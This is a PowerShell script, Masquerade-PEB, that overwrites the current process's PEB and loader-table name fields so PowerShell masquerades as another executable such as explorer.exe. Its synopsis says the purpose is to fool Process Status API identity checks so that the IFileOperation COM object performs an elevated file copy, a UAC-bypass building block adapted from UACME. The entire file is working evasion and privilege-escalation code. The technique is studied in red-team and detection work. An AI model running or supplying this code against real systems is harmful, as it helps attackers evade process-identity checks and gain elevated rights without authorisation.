function Masquerade-PEB {
<#
.SYNOPSIS
    Masquerade-PEB uses NtQueryInformationProcess to get a handle to powershell's
    PEB. From there itreplaces a number of UNICODE_STRING structs in memory to
    give powershell the appearance of a different process. Specifically, the
    function will overwrite powershell's "ImagePathName" & "CommandLine" in
    _RTL_USER_PROCESS_PARAMETERS and the "FullDllName" & "BaseDllName" in the
    _LDR_DATA_TABLE_ENTRY linked list.
    
    This can be useful as it would fool any Windows work-flows which rely solely
    on the Process Status API to check process identity. A practical example would
    be the IFileOperation COM Object which can perform an elevated file copy if it
    thinks powershell is really explorer.exe ;)!

    Notes:
      * Works on x32/64.
    
      * Most of these API's and structs are undocumented. I strongly recommend
        @rwfpl's terminus project as a reference guide!
          + http://terminus.rewolf.pl/terminus/
    
      * Masquerade-PEB is basically a reimplementation of two functions in UACME
        by @hFireF0X. My code is quite different because,  unfortunately, I don't
        have access to all those c++ goodies and I could not get a callback for
        LdrEnumerateLoadedModules working!
          + supMasqueradeProcess: https://github.com/hfiref0x/UACME/blob/master/Source/Akagi/sup.c#L504
          + supxLdrEnumModulesCallback: https://github.com/hfiref0x/UACME/blob/master/Source/Akagi/sup.c#L477

.DESCRIPTION
    Author: Ruben Boonen (@FuzzySec)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

.EXAMPLE
    C:\PS> Masquerade-PEB -BinPath "C:\Windows\explorer.exe"
#>

	param (
		[Parameter(Mandatory = $True)]
		[string]$BinPath
	)

	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;

	[StructLayout(LayoutKind.Sequential)]
	public struct UNICODE_STRING
	{
		public UInt16 Length;
		public UInt16 MaximumLength;
		public IntPtr Buffer;
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct _LIST_ENTRY
	{
		public IntPtr Flink;
		public IntPtr Blink;
	}
	
	[StructLayout(LayoutKind.Sequential)]
	public struct _PROCESS_BASIC_INFORMATION
	{
		public IntPtr ExitStatus;
		public IntPtr PebBaseAddress;
		public IntPtr AffinityMask;
		public IntPtr BasePriority;
		public UIntPtr UniqueProcessId;
		public IntPtr InheritedFromUniqueProcessId;
	}

	/// Partial _PEB
	[StructLayout(LayoutKind.Explicit, Size = 64)]
	public struct _PEB
	{
		[FieldOffset(12)]
		public IntPtr Ldr32;
		[FieldOffset(16)]
		public IntPtr ProcessParameters32;
		[FieldOffset(24)]
		public IntPtr Ldr64;
		[FieldOffset(28)]
		public IntPtr FastPebLock32;
		[FieldOffset(32)]
		public IntPtr ProcessParameters64;
		[FieldOffset(56)]
		public IntPtr FastPebLock64;
	}

	/// Partial _PEB_LDR_DATA
	[StructLayout(LayoutKind.Sequential)]
	public struct _PEB_LDR_DATA
	{
		public UInt32 Length;
		public Byte Initialized;
		public IntPtr SsHandle;
		public _LIST_ENTRY InLoadOrderModuleList;
		public _LIST_ENTRY InMemoryOrderModuleList;
		public _LIST_ENTRY InInitializationOrderModuleList;
		public IntPtr EntryInProgress;
	}

	/// Partial _LDR_DATA_TABLE_ENTRY
	[StructLayout(LayoutKind.Sequential)]
	public struct _LDR_DATA_TABLE_ENTRY
	{
		public _LIST_ENTRY InLoadOrderLinks;
		public _LIST_ENTRY InMemoryOrderLinks;
		public _LIST_ENTRY InInitializationOrderLinks;
		public IntPtr DllBase;
		public IntPtr EntryPoint;
		public UInt32 SizeOfImage;
		public UNICODE_STRING FullDllName;
		public UNICODE_STRING BaseDllName;
	}

	public static class Kernel32
	{
		[DllImport("kernel32.dll")]
		public static extern UInt32 GetLastError();

		[DllImport("kernel32.dll")]
		public static extern Boolean VirtualProtectEx(
			IntPtr hProcess,
			IntPtr lpAddress,
			UInt32 dwSize,
			UInt32 flNewProtect,
			ref UInt32 lpflOldProtect);

		[DllImport("kernel32.dll")]
		public static extern Boolean WriteProcessMemory(
			IntPtr hProcess,
			IntPtr lpBaseAddress,
			IntPtr lpBuffer,
			UInt32 nSize,
			ref UInt32 lpNumberOfBytesWritten);
	}

	public static class Ntdll
	{
		[DllImport("ntdll.dll")]
		public static extern int NtQueryInformationProcess(
			IntPtr processHandle, 
			int processInformationClass,
			ref _PROCESS_BASIC_INFORMATION processInformation,
			int processInformationLength,
			ref int returnLength);

		[DllImport("ntdll.dll")]
		public static extern void RtlEnterCriticalSection(
			IntPtr lpCriticalSection);

		[DllImport("ntdll.dll")]
		public static extern void RtlLeaveCriticalSection(
			IntPtr lpCriticalSection);
	}
"@

	# Flag architecture $x32Architecture/!$x32Architecture
	if ([System.IntPtr]::Size -eq 4) {
		$x32Architecture = 1
	}

	# Current Proc handle
	$ProcHandle = (Get-Process -Id ([System.Diagnostics.Process]::GetCurrentProcess().Id)).Handle

	# Helper function to overwrite UNICODE_STRING structs in memory
	function Emit-UNICODE_STRING {
		param(
			[IntPtr]$hProcess,
			[IntPtr]$lpBaseAddress,
			[UInt32]$dwSize,
			[String]$data
		)

		# Set access protections -> PAGE_EXECUTE_READWRITE
		[UInt32]$lpflOldProtect = 0
		$CallResult = [Kernel32]::VirtualProtectEx($hProcess, $lpBaseAddress, $dwSize, 0x40, [ref]$lpflOldProtect)

		# Create replacement struct
		$UnicodeObject = New-Object UNICODE_STRING
		$UnicodeObject_Buffer = $data
		[UInt16]$UnicodeObject.Length = $UnicodeObject_Buffer.Length*2
		[UInt16]$UnicodeObject.MaximumLength = $UnicodeObject.Length+1
		[IntPtr]$UnicodeObject.Buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($UnicodeObject_Buffer)
		[IntPtr]$InMemoryStruct = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($dwSize)
		[system.runtime.interopservices.marshal]::StructureToPtr($UnicodeObject, $InMemoryStruct, $true)

		# Overwrite PEB UNICODE_STRING struct
		[UInt32]$lpNumberOfBytesWritten = 0
		$CallResult = [Kernel32]::WriteProcessMemory($hProcess, $lpBaseAddress, $InMemoryStruct, $dwSize, [ref]$lpNumberOfBytesWritten)

		# Free $InMemoryStruct
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($InMemoryStruct)
	}

	# Process Basic Information
	$PROCESS_BASIC_INFORMATION = New-Object _PROCESS_BASIC_INFORMATION
	$PROCESS_BASIC_INFORMATION_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($PROCESS_BASIC_INFORMATION)
	$returnLength = New-Object Int
	$CallResult = [Ntdll]::NtQueryInformationProcess($ProcHandle, 0, [ref]$PROCESS_BASIC_INFORMATION, $PROCESS_BASIC_INFORMATION_Size, [ref]$returnLength)

	# PID & PEB address
	echo "`n[?] PID $($PROCESS_BASIC_INFORMATION.UniqueProcessId)"
	if ($x32Architecture) {
		echo "[+] PebBaseAddress: 0x$("{0:X8}" -f $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt32())"
	} else {
		echo "[+] PebBaseAddress: 0x$("{0:X16}" -f $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64())"
	}

	# Lazy PEB parsing
	$_PEB = New-Object _PEB
	$_PEB = $_PEB.GetType()
	$BufferOffset = $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64()
	$NewIntPtr = New-Object System.Intptr -ArgumentList $BufferOffset
	$PEBFlags = [system.runtime.interopservices.marshal]::PtrToStructure($NewIntPtr, [type]$_PEB)

	# Take ownership of PEB
	# Not sure this is strictly necessary but why not!
	if ($x32Architecture) {
		[Ntdll]::RtlEnterCriticalSection($PEBFlags.FastPebLock32)
	} else {
		[Ntdll]::RtlEnterCriticalSection($PEBFlags.FastPebLock64)
	} echo "[!] RtlEnterCriticalSection --> &Peb->FastPebLock"

	# &Peb->ProcessParameters->ImagePathName/CommandLine
	if ($x32Architecture) {
		# Offset to &Peb->ProcessParameters
		$PROCESS_PARAMETERS = $PEBFlags.ProcessParameters32.ToInt64()
		# x86 UNICODE_STRING struct's --> Size 8-bytes = (UInt16*2)+IntPtr
		[UInt32]$StructSize = 8
		$ImagePathName = $PROCESS_PARAMETERS + 0x38
		$CommandLine = $PROCESS_PARAMETERS + 0x40
	} else {
		# Offset to &Peb->ProcessParameters
		$PROCESS_PARAMETERS = $PEBFlags.ProcessParameters64.ToInt64()
		# x64 UNICODE_STRING struct's --> Size 16-bytes = (UInt16*2)+IntPtr
		[UInt32]$StructSize = 16
		$ImagePathName = $PROCESS_PARAMETERS + 0x60
		$CommandLine = $PROCESS_PARAMETERS + 0x70
	}

	# Overwrite PEB struct
	# Can easily be extended to other UNICODE_STRING structs in _RTL_USER_PROCESS_PARAMETERS(/or in general)
	$ImagePathNamePtr = New-Object System.Intptr -ArgumentList $ImagePathName
	$CommandLinePtr = New-Object System.Intptr -ArgumentList $CommandLine
	if ($x32Architecture) {
		echo "[>] Overwriting &Peb->ProcessParameters.ImagePathName: 0x$("{0:X8}" -f $ImagePathName)"
		echo "[>] Overwriting &Peb->ProcessParameters.CommandLine: 0x$("{0:X8}" -f $CommandLine)"
	} else {
		echo "[>] Overwriting &Peb->ProcessParameters.ImagePathName: 0x$("{0:X16}" -f $ImagePathName)"
		echo "[>] Overwriting &Peb->ProcessParameters.CommandLine: 0x$("{0:X16}" -f $CommandLine)"
	}
	Emit-UNICODE_STRING -hProcess $ProcHandle -lpBaseAddress $ImagePathNamePtr -dwSize $StructSize -data $BinPath
	Emit-UNICODE_STRING -hProcess $ProcHandle -lpBaseAddress $CommandLinePtr -dwSize $StructSize -data $BinPath

	# &Peb->Ldr
	$_PEB_LDR_DATA = New-Object _PEB_LDR_DATA
	$_PEB_LDR_DATA = $_PEB_LDR_DATA.GetType()
	if ($x32Architecture) {
		$BufferOffset = $PEBFlags.Ldr32.ToInt64()
	} else {
		$BufferOffset = $PEBFlags.Ldr64.ToInt64()
	}
	$NewIntPtr = New-Object System.Intptr -ArgumentList $BufferOffset
	$LDRFlags = [system.runtime.interopservices.marshal]::PtrToStructure($NewIntPtr, [type]$_PEB_LDR_DATA)

	# &Peb->Ldr->InLoadOrderModuleList->Flink
	$_LDR_DATA_TABLE_ENTRY = New-Object _LDR_DATA_TABLE_ENTRY
	$_LDR_DATA_TABLE_ENTRY = $_LDR_DATA_TABLE_ENTRY.GetType()
	$BufferOffset = $LDRFlags.InLoadOrderModuleList.Flink.ToInt64()
	$NewIntPtr = New-Object System.Intptr -ArgumentList $BufferOffset

	# Traverse doubly linked list
	# &Peb->Ldr->InLoadOrderModuleList->InLoadOrderLinks->Flink
	# This is probably overkill, powershell.exe should always be the first entry for InLoadOrderLinks
	echo "[?] Traversing &Peb->Ldr->InLoadOrderModuleList doubly linked list"
	while ($ListIndex -ne $LDRFlags.InLoadOrderModuleList.Blink) {
		$LDREntry = [system.runtime.interopservices.marshal]::PtrToStructure($NewIntPtr, [type]$_LDR_DATA_TABLE_ENTRY)

		if ([System.Runtime.InteropServices.Marshal]::PtrToStringUni($LDREntry.FullDllName.Buffer) -like "*powershell.exe*") {

			if ($x32Architecture) {
				# x86 UNICODE_STRING struct's --> Size 8-bytes = (UInt16*2)+IntPtr
				[UInt32]$StructSize = 8
				$FullDllName = $BufferOffset + 0x24
				$BaseDllName = $BufferOffset + 0x2C
			} else {
				# x64 UNICODE_STRING struct's --> Size 16-bytes = (UInt16*2)+IntPtr
				[UInt32]$StructSize = 16
				$FullDllName = $BufferOffset + 0x48
				$BaseDllName = $BufferOffset + 0x58
			}

			# Overwrite _LDR_DATA_TABLE_ENTRY struct
			# Can easily be extended to other UNICODE_STRING structs in _LDR_DATA_TABLE_ENTRY(/or in general)
			$FullDllNamePtr = New-Object System.Intptr -ArgumentList $FullDllName
			$BaseDllNamePtr = New-Object System.Intptr -ArgumentList $BaseDllName
			if ($x32Architecture) {
				echo "[>] Overwriting _LDR_DATA_TABLE_ENTRY.FullDllName: 0x$("{0:X8}" -f $FullDllName)"
				echo "[>] Overwriting _LDR_DATA_TABLE_ENTRY.BaseDllName: 0x$("{0:X8}" -f $BaseDllName)"
			} else {
				echo "[>] Overwriting _LDR_DATA_TABLE_ENTRY.FullDllName: 0x$("{0:X16}" -f $FullDllName)"
				echo "[>] Overwriting _LDR_DATA_TABLE_ENTRY.BaseDllName: 0x$("{0:X16}" -f $BaseDllName)"
			}
			Emit-UNICODE_STRING -hProcess $ProcHandle -lpBaseAddress $FullDllNamePtr -dwSize $StructSize -data $BinPath
			Emit-UNICODE_STRING -hProcess $ProcHandle -lpBaseAddress $BaseDllNamePtr -dwSize $StructSize -data $BinPath
		}
		
		$ListIndex = $BufferOffset = $LDREntry.InLoadOrderLinks.Flink.ToInt64()
		$NewIntPtr = New-Object System.Intptr -ArgumentList $BufferOffset
	}

	# Release ownership of PEB
	if ($x32Architecture) {
		[Ntdll]::RtlLeaveCriticalSection($PEBFlags.FastPebLock32)
	} else {
		[Ntdll]::RtlLeaveCriticalSection($PEBFlags.FastPebLock64)
	} echo "[!] RtlLeaveCriticalSection --> &Peb->FastPebLock`n"
}